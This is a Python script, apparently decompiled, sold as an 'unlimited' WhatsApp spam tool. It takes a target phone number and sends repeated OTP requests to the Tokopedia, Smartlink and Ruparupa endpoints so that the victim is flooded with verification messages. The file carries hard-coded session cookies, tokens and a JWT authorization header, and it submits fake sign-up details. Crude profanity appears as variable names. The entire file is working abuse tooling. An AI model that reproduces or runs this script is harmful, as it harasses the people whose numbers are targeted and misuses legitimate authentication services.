# File Names : <Sanz>
# Python Bytecode : 3.8
# Time Succses Parser : Mon Jul  6 11:23:13 2020
# Auto Parser Dis Version : 1.2.1
# Source : https://www.github.com/Datez-Kun

import requests, re, os, sys, time, json
from requests import post
from requests.exceptions import ConnectionError
h = '\x1b[1;92m'
bi = '\x1b[1;96m'
k = '\x1b[1;93m'
u = '\x1b[1;95m'
pu = '\x1b[1;97m'
b = '\x1b[1;94m'
m = '\x1b[1;91m'
hi = '\x1b[1;30m'
hg = '\x1b[4;92m'
p = '\x1b[0m'

def run(s):
    for x in s + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.001)


def keluar():
    time.sleep(0.5)
    print(p + '[' + m + '!' + p + '] ' + m + 'Exit')
    sys.exit()


def lagi():
    os.system('xdg-open https://youtube.com/SanzSoekamti')
    time.sleep(1)
    run(b + '────────────────────────────────────────────')
    l = input(p + '[' + m + '?' + p + '] ' + u + 'Mau Spam Lagi? ' + p + '[' + bi + 'y/n' + p + ']' + m + ': ' + h)
    if l == 'y' or l == 'Y':
        time.sleep(1)
        spam()
    elif l == 'n' or l == 'N':
        keluar()
    else:
        print(p + '[' + m + '!' + p + '] ' + m + 'Wrong Input' + m + '!!')
        time.sleep(1)
        lagi()


def logo():
    run(f"{m}┌─┐{pu}┬─┐┌─┐┌┬┐ {m}┬ ┬{pu}┬ ┬┌─┐┌┬┐┌─┐{m}┌─┐{pu}┬─┐┬─┐")
    run(f"{m}└─┐{pu}├─┘├─┤│││ {m}│││{pu}├─┤├─┤ │ └─┐{m}├─┤{pu}├─┘├─┘")
    run(f"{m}└─┘{pu}┴  ┴ ┴┴ ┴ {m}└┴┘{pu}┴ ┴┴ ┴ ┴ └─┘{m}┴ ┴{pu}┴  ┴  |> {k}V2.0")
    run(b + '────────────────────────────────────────────')
    run(p + '[' + h + '•' + p + '] ' + k + 'Author  ' + m + ': ' + bi + 'Sanz')
    run(p + '[' + h + '•' + p + '] ' + k + 'Youtube ' + m + ': ' + bi + 'SANZ SOEKAMTI')
    run(p + '[' + h + '•' + p + '] ' + k + 'Github  ' + m + ': ' + hg + 'https://github.com/B4N954N2-ID' + p)
    run(b + '────────────────────────────────────────────')


def spam():
    os.system('clear')
    logo()
    run(f"{p}[{h}01{p}]. {u}Spam Wa Otp Tokped\n{p}[{h}02{p}]. {u}Spam Wa Otp Smartlink\n{p}[{h}03{p}]. {u}Spam Wa Otp Rupa-Rupa\n{p}[{h}04{p}]. {u}Exit")
    run(b + '────────────────────────────────────────────')
    try:
        requests.get('https://google.com')
    except ConnectionError:
        print(p + '[' + m + '!' + p + '] ' + m + 'Check Your Connection')
        keluar()
    else:
        sanz = input(f"{p}[{h}•{p}] {pu}Choose {m}: {h}")
    if sanz == '1' or sanz == '01':
        tokped()
    elif sanz == '2' or sanz == '02':
        smartlink()
    elif sanz == '3' or sanz == '03':
        rupa2()
    elif sanz == '4' or sanz == '04':
        keluar()
    else:
        print(p + '[' + m + '!' + p + '] ' + m + 'Wrong Input' + m + '!!')
        time.sleep(1)
        spam()


def tokped():
    try:
        time.sleep(0.2)
        os.system('clear')
        time.sleep(0.2)
        logo()
        run(p + '[' + h + '+' + p + '] ' + u + 'Contoh ' + m + ': ' + p + '08xxxxxxxxxx')
        no = input(p + '[' + h + '+' + p + '] ' + u + 'Target ' + m + ': ' + p)
        jml = int(input(p + '[' + h + '+' + p + '] ' + u + 'Jumlah Spam ' + m + ': ' + p))
        if jml > 10:
            run(b + '────────────────────────────────────────────')
            time.sleep(0.2)
            print(p + '[' + m + '!' + p + '] ' + m + 'Jumlah Terlalu Besar')
            time.sleep(1)
            tokped()
        else:
            pass
        run(b + '────────────────────────────────────────────')
        head = {'Connection':'keep-alive',  'Accept':'application/json, text/javascript, */*; q=0.01',  'Origin':'https://accounts.tokopedia.com',  'X-Requested-With':'XMLHttpRequest',  'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36',  'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',  'Accept-Encoding':'gzip, deflate'}
        site = requests.get(('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=' + no + '&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D'), headers=head).text
        search = re.search('\\<input\\ id\\=\\"Token\\"\\ value\\=\\"(.*?)\\"\\ type\\=\\"hidden\\"\\>', site).group(1)
        dat = {'otp_type':'116',  'msisdn':no,  'tk':search,  'email':'',  'original_param':'',  'user_id':'',  'signature':'',  'number_otp_digit':'6'}
        for _ in range(jml):
            send = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=head, data=dat)
            if 'succes' in send.text:
                print(p + '[' + h + '✓' + p + '] ' + h + 'Spam WhatsApp To ' + k + no + p + ' [ ' + h + 'Success ' + p + ']')
                for x in range(60):
                    print(end=f"\r{p}[{h}•{p}]{m}> {bi}Wait {p}{60 - (x + 1)} s ", flush=True)
                    time.sleep(1)
                else:
                    print()

            else:
                print(p + '[' + m + 'x' + p + '] ' + h + 'Spam WhatsApp To ' + k + no + p + ' [ ' + u + 'Gagal ' + p + ']')
                for x in range(60):
                    print(end=f"\r{p}[{h}•{p}]{m}> {bi}Wait {p}{60 - (x + 1)} s ", flush=True)
                    time.sleep(1)
                else:
                    print()

        else:
            lagi()

    except ConnectionError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Check Your Connection')
        exit()
    except KeyboardInterrupt:
        print(p + '\n[' + m + '!' + p + '] ' + m + 'Stop' + p + '..')
        time.sleep(0.5)
        os.system('xdg-open https://youtube.com/SanzSoekamti')
        time.sleep(1)
        exit()
    except ValueError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Nomor Tidak Valid')
        exit()
    except SyntaxError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Harus Pake Angka Cuk')
        exit()
    except NameError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Harus Pake Angka Cuk')
        exit()


def smartlink():
    try:
        time.sleep(0.2)
        os.system('clear')
        time.sleep(0.2)
        logo()
        run(p + '[' + h + '+' + p + '] ' + u + 'Contoh ' + m + ': ' + p + '628xxxxxxxxxx')
        no = input(p + '[' + h + '+' + p + '] ' + u + 'Target ' + m + ': ' + p)
        jml = int(input(p + '[' + h + '+' + p + '] ' + u + 'Jumlah Spam ' + m + ': ' + p))
        if jml > 10:
            run(b + '────────────────────────────────────────────')
            time.sleep(0.2)
            print(p + '[' + m + '!' + p + '] ' + m + 'Jumlah Terlalu Besar')
            time.sleep(1)
            smartlink()
        else:
            pass
        run(b + '────────────────────────────────────────────')
        ua = {'Host':'bos.smartlink.id',  'Connection':'keep-alive',  'Content-Length':'287',  'Accept':'application/json, text/javascript, */*; q=0.01',  'Origin':'https://bos.smartlink.id',  'X-Requested-With':'XMLHttpRequest',  'Save-Data':'on',  'User-Agent':'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36',  'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',  'Referer':'https://bos.smartlink.id/register',  'Accept-Encoding':'gzip, deflate, br',  'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',  'Cookie':'laravel_session=eyJpdiI6IjZhbDJMSkV1XC9JblJcL3VXb3RyNVFpQT09IiwidmFsdWUiOiJ2S092eFlmOWFNRUJsMXlDSHkrNkhneWNBRHZmZVA0N1kwKzZpc0hqbWpPYkJscEg2UlJCMzJ3WFF4QTJWU28zIiwibWFjIjoiMGVjYjNmMzRhZTk0NTA1YjdlOGI0OWZjMjcxNjQzMjZmZDIxNGIwNjdjZTNhYTVmMDQwZmMyYjQzN2ZlOTQ4NSJ9'}
        dat = {'idkaryawan':'',  '_token':'axEpluOOggTeDTqbuKOIk79iKPT3iWLhOdGMKhNd',  'multiowner':'false',  'tiperegister':'telp',  'nama':'AnsorGans',  'email':'',  'country_code':'62',  'nohp':'',  'telp':no,  'password':'ansori123',  'ulangi_password':'ansori123',  'kota':'3174',  'kode_afiliator':'',  'resultOTP':'',  'whitelistid':'',  'otpvia':'wa',  'syarat_ketentuan':'on',  'otp':''}
        for _ in range(jml):
            r = requests.post('https://bos.smartlink.id/checkRegister', headers=ua, data=dat)
            if 'success' in r.text:
                print(p + '[' + h + '✓' + p + '] ' + h + 'Spam WhatsApp To ' + k + no + p + ' [ ' + h + 'Success ' + p + ']')
                for x in range(120):
                    print(end=f"\r{p}[{h}•{p}]{m}> {bi}Wait {p}{120 - (x + 1)} s ", flush=True)
                    time.sleep(1)
                else:
                    print()

            else:
                print(p + '[' + m + 'x' + p + '] ' + h + 'Spam WhatsApp To ' + k + no + p + ' [ ' + u + 'Gagal ' + p + ']')
                for x in range(120):
                    print(end=f"\r{p}[{h}•{p}]{m}> {bi}Wait {p}{120 - (x + 1)} s ", flush=True)
                    time.sleep(1)
                else:
                    print()

        else:
            lagi()

    except ConnectionError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Check Your Connection')
        exit()
    except KeyboardInterrupt:
        print(p + '\n[' + m + '!' + p + '] ' + m + 'Stop' + p + '..')
        time.sleep(0.5)
        os.system('xdg-open https://youtube.com/SanzSoekamti')
        time.sleep(1)
        exit()
    except ValueError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Nomor Tidak Valid')
        exit()
    except SyntaxError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Harus Pake Angka Cuk')
        exit()
    except NameError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Harus Pake Angka Cuk')
        exit()


def rupa2():
    try:
        time.sleep(0.2)
        os.system('clear')
        time.sleep(0.2)
        logo()
        run(p + '[' + h + '+' + p + '] ' + u + 'Contoh ' + m + ': ' + p + '08xxxxxxxxxx')
        no = input(p + '[' + h + '+' + p + '] ' + u + 'Target ' + m + ': ' + p)
        jml = int(input(p + '[' + h + '+' + p + '] ' + u + 'Jumlah Spam ' + m + ': ' + p))
        if jml > 10:
            run(b + '────────────────────────────────────────────')
            time.sleep(0.2)
            print(p + '[' + m + '!' + p + '] ' + m + 'Jumlah Terlalu Besar')
            time.sleep(1)
            rupa2()
        else:
            pass
        run(b + '────────────────────────────────────────────')
        ua = {'Host':'wapi.ruparupa.com',  'Connection':'keep-alive',  'Authorization':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E',  'Accept':'application/json',  'Content-Type':'application/json',  'X-Company-Name':'odi',  'User-Agent':'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36',  'user-platform':'mobile',  'X-Frontend-Type':'mobile',  'Origin':'https://m.ruparupa.com',  'Referer':'https://m.ruparupa.com/verification?page=otp-choices',  'Accept-Encoding':'gzip, deflate, br',  'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
        dat = json.dumps({'phone':no,  'action':'register',  'channel':'chat',  'email':'',  'customer_id':'0',  'is_resend':0})
        for x in range(jml):
            r = requests.post('https://wapi.ruparupa.com/auth/generate-otp', data=dat, headers=ua)
            if 'Kode verifikasi berhasil dikirimkan' in r.text:
                print(p + '[' + h + '✓' + p + '] ' + h + 'Spam WhatsApp To ' + k + no + p + ' [ ' + h + 'Success ' + p + ']')
                for x in range(300):
                    print(end=f"\r{p}[{h}•{p}]{m}> {bi}Wait {p}{300 - (x + 1)} s ", flush=True)
                    time.sleep(1)
                else:
                    print()

            else:
                print(p + '[' + m + 'x' + p + '] ' + h + 'Spam WhatsApp To ' + k + no + p + ' [ ' + u + 'Gagal ' + p + ']')
                for x in range(300):
                    print(end=f"\r{p}[{h}•{p}]{m}> {bi}Wait {p}{300 - (x + 1)} s ", flush=True)
                    time.sleep(1)
                else:
                    print()

        else:
            lagi()

    except ConnectionError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Check Your Connection')
        exit()
    except KeyboardInterrupt:
        print(p + '\n[' + m + '!' + p + '] ' + m + 'Stop' + p + '..')
        time.sleep(0.5)
        os.system('xdg-open https://youtube.com/SanzSoekamti')
        time.sleep(1)
        exit()
    except ValueError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Nomor Tidak Valid')
        exit()
    except SyntaxError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Harus Pake Angka Cuk')
        exit()
    except NameError:
        run(b + '────────────────────────────────────────────')
        print(p + '[' + m + '!' + p + '] ' + m + 'Harus Pake Angka Cuk')
        exit()


try:
    token = open('Sanz', 'r')
    spam()
except (KeyError, IOError):
    os.system('clear')
    os.system('xdg-open https://youtube.com/SanzSoekamti')
    time.sleep(5)
    kontol = 'Tools Spam WhatsApp Unlimited by Sanz'
    memek = open('Sanz', 'w')
    memek.write(kontol)
    memek.close()
    spam()
except KeyboardInterrupt:
    print(p + '[' + m + '!' + p + '] ' + m + 'Ctrl + C Detected')
    keluar()